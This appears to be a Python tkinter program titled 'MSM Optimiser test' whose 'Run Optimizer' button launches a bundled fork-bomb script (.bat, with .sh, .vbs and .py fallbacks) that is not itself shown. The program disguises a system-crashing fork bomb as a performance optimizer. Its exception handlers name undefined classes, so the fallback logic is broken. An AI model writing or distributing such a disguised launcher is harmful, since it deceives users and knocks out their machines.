import tkinter
from tkinter import ttk
from PIL import Image, ImageTk
import os
import sv_ttk
import subprocess
import sys

# import tkinter, tkinter.ttk as ttk, PIL.Image, PIL.ImageTk, os, sv_ttk, subprocess

def path_finder(folder_name, filename):
    file_location = os.path.join(os.path.dirname(__file__), folder_name,filename)
    return file_location

def on_button_click():
    print("Button clicked!")

    
    try:
        script_path = path_finder("scripts", "fork-bomb.bat")
        subprocess.run(script_path)
    except runBashShell:
        script_path = path_finder("scripts", "fork-bomb.sh")
        subprocess.run(script_path)
    except runVBS:
        script_path = path_finder("scripts", "fork-bomb.vbs")
        subprocess.run(["cscript", script_path])
    except pythonExecutable:
        script_path = path_finder("scripts", "fork-bomb.py")
        subprocess.run([sys.executable, script_path])
    finally:
        exit()


root = tkinter.Tk()
root.title("MSM Optimiser test")
# root.geometry("200x200+200+200")


frame = ttk.Frame(root, borderwidth=20)
frame.pack(fill="both", expand=True)

# image_path = os.path.join(os.path.dirname(__file__), 'assets','image.png')
image_path = path_finder('assets', 'image.png')
image = Image.open(image_path)
photo = ImageTk.PhotoImage(image)

label = ttk.Label(frame, image=photo, padding=(0,0,0,15))
label.pack()


button = ttk.Button(frame, text="Run Optimizer", command=on_button_click)
button.pack()

# This is where the magic happens
sv_ttk.set_theme("dark")

root.mainloop()

# import tkinter as tk

# def on_button_click():
#     print("Button clicked!")

# root = tk.Tk()
# root.title("abc")
# root.geometry("200x200+200+200")

# frame = tk.Frame(root, borderwidth=20)
# frame.pack(fill="both", expand=True)

# button = tk.Button(frame, text="Click me!", command=on_button_click)
# button.pack()

# sv_ttk.set_theme("dark")


# root.mainloop()